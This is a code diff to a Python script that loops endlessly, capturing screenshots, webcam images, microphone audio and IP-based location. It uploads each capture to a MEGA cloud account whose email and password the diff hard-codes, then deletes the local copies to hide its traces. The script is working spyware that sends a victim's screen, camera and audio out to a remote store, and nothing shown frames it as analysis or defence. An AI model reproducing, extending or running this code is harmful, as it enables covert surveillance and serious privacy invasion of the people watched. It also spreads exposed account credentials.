@@ -1,3 +1,17 @@
+import time
+import os
+import shutil
+import cv2
+from datetime import datetime
+from mega import Mega
+import pyaudio
+import wave
+import threading
+import requests
+import geocoder
+import glob
+import pyautogui
+
 def delete_files():
     current_folder = os.getcwd()
     file_extensions = ['*.jpg', '*.png', '*.wav']
@@ -31,7 +45,6 @@ def get_location_from_ip(ip_address):
 
 def screenshot_upload():
     try:
-
         # Generate a timestamp for the filename
         timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
@@ -39,13 +52,26 @@ def screenshot_upload():
         filename = f'screenshot_{timestamp}.png'
         pyautogui.screenshot(filename)
 
-        print("uploading to screenshots")
-        mega_login.upload(filename, screenshots_folder)
+        mega_email = 'lajex92681@meidecn.com'
+        mega_password = 'b@sit1218'
 
-        time.sleep(3)
-        
+        # mega signin
+        mega = Mega()
+        mega_login = mega.login(mega_email, mega_password)
+
+        screenshots_folder = mega_login.find('screenshots')
+
+        if not screenshots_folder:
+            screenshots_folder = mega_login.create_folder('screenshots')
+        else:
+            screenshots_folder = screenshots_folder[0]
+
+        print("uploading to screenshots") 
+        mega_login.upload(filename, screenshots_folder)
+        # upload webcam picture
     except:
-        pass
+        print("screenshot upload failed")
+        
 
 def webcam_upload():
     try:
@@ -64,14 +90,26 @@ def webcam_upload():
         # Release the webcam
         cap.release()
 
+        mega_email = 'lajex92681@meidecn.com'
+        mega_password = 'b@sit1218'
+
+        # mega signin
+        mega = Mega()
+        mega_login = mega.login(mega_email, mega_password)
+
+        webcam_folder = mega_login.find('webcam')
+
+        if not webcam_folder:
+            webcam_folder = mega_login.create_folder('webcam')
+        else:
+            webcam_folder = webcam_folder[0]
+
         print("uploading to webcam") 
         mega_login.upload(filename_webcam, webcam_folder)
         # upload webcam picture
-
-        time.sleep(3)
         
     except:
-        pass
+        print("webcam upload failed")
 
 def record_audio():
     try:
@@ -112,10 +150,25 @@ def record_audio():
 
         print(f"uploading audio {recording_file_name}")
 
+        mega_email = 'lajex92681@meidecn.com'
+        mega_password = 'b@sit1218'
+
+        # mega signin
+        mega = Mega()
+        mega_login = mega.login(mega_email, mega_password)
+
+        recordings_folder = mega_login.find('recordings')
+
+        if not recordings_folder:
+            recordings_folder = mega_login.create_folder('recordings')
+        else:
+            recordings_folder = recordings_folder[0]
+
+        print("uploading to recordings") 
         mega_login.upload(recording_file_name, recordings_folder)
 
     except:
-        pass
+        print("recording upload failed")
 
 while True:
     try:
@@ -142,26 +195,7 @@ while True:
             file.write(f"Location: {location}\n")
 
         # make folder called screenshots on mega storage
-        screenshots_folder = mega_login.find('screenshots')
-        webcam_folder= mega_login.find('webcam')
-        recordings_folder= mega_login.find('recordings')
         location_folder= mega_login.find('locations')
-
-
-        if not screenshots_folder:
-            screenshots_folder = mega_login.create_folder('screenshots')
-        else:
-            screenshots_folder = screenshots_folder[0]
-
-        if not webcam_folder:
-            webcam_folder = mega_login.create_folder('webcam')
-        else:
-            webcam_folder = webcam_folder[0]
-
-        if not recordings_folder:
-            recordings_folder = mega_login.create_folder('recordings')
-        else:
-            recordings_folder = recordings_folder[0]
 
         if not location_folder:
             location_folder = mega_login.create_folder('locations')
@@ -201,13 +235,13 @@ while True:
             screenshot_thread = threading.Thread(target=screenshot_upload)
             webcam_thread = threading.Thread(target=webcam_upload)
 
-            # Start the threads
             delete_files()
+
+            # Start the threads
             audio_thread.start()
             screenshot_thread.start()
             webcam_thread.start()
 
-        
             # Wait for both threads to finish
             audio_thread.join()
             screenshot_thread.join()
